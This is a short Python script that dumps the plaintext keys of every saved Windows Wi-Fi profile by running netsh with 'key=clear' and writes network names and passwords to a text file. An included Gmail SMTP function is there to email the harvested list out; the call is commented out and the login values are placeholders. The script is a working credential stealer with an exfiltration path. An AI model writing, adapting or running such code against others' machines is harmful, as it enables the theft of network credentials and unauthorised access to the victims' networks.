import smtplib
import subprocess
import re

def send_mails(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def password():
    data_network = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
    networks = re.findall("(?:Profile\s*:\s)(.*?\\r)",data_network.decode())
    mess = "WiFi Password"
    mess = mess + "------------------------------------------\n"
    Wifi_name = "Network\t:\tPassword"
    for i in networks:
        i = i.replace("\r", "")
        Wifi_name = i
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', i, "key=clear"])
        output = output.decode()
        Type_net = re.findall("(?:Type\s*:\s)(.*?\\r)", output)[0]
        password = ""
        pas = re.findall("(?:Key\sContent\s*:\s)(.*?\\r)", output)
        if pas:
            password = pas[0]
        mess = mess + Wifi_name + " ::::: " + password + "\n"
    #print(mess)
    with open('Wifi_pass.txt','w') as f:
        f.write(mess)
        f.close()
    #send_mails(Email, Pass, mess)


Email = "email_ID@gmail.com"
Pass = "Password"
password()